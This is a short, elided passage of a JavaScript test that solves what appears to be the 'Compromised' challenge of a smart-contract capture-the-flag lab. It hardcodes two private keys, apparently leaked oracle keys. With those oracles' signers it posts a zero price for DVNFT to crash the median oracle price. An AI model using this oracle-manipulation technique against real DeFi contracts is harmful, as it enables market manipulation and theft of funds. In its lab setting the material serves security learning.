...
describe('Compromised challenge', function () {
    ...
    it('Exploit', async function () {        
        ...
        let key1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        let key2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
        ...
        let medianPrice = await this.oracle.getMedianPrice("DVNFT");
        console.log("Median price is :",medianPrice.toString());
        
        await this.oracle.connect(oracle1).postPrice("DVNFT",ethers.utils.parseEther("0"));
        await this.oracle.connect(oracle2).postPrice("DVNFT",ethers.utils.parseEther("0"));

        medianPrice = await this.oracle.getMedianPrice("DVNFT");
        console.log("Median price is :", medianPrice.toString());
